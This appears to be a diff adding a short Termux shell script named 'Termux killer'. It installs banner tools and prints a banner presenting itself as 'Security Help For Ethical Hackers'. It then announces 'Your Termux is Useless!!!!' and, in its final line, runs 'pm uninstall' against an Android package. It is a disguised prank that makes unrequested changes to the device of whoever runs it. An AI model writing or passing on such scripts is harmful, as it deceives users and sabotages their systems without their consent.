@@ -1,0 +1,24 @@
+
+clear
+apt install figlet
+apt install ruby
+gem install lolcat
+clear
+figlet -f big "         Termux killer" | lolcat
+#This colour
+cyan='\e[0;36m'
+lightgreen='\e[1;32m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+echo -e $lightgreen "                   Security Help For Ethical Hackers... "
+echo " "
+echo -e $cyan "                             -Sutariya Parixit "
+echo " "
+echo " "
+echo " "
+echo
+echo
+echo -e "\e[1m\e[33m This is \e[32mNotepad!!!:)"
+echo
+echo -e "\e[1m Your Termux is \e[31mUseless!!!!"
+pm uninstall Bhai4You
